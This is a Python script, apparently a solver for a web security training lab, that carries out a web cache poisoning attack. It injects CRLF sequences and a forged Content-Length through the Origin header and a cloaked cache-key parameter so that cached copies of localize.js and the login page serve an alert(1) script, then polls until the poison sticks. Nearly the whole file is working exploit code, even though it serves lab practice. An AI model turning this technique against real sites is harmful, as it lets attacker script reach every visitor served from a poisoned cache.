import requests
from urllib.parse import unquote_plus
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def poison_first_endpoint(self):
        headers = {
            'Origin': 'x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$',
            'Pragma': 'x-get-cache-key'
        }
        response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers)
        while True:
            if 'alert(1)' not in response.text:
                response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers)
            else:
                break

    def poison_second_endpoint(self):
        headers = {
            'Pragma': 'x-get-cache-key'
        }
        response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers)
        while True:
            if 'alert(1)' not in response.text:
                response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers)
            else:
                break

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.poison_second_endpoint()
        self.poison_first_endpoint()
        time.sleep(30)
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
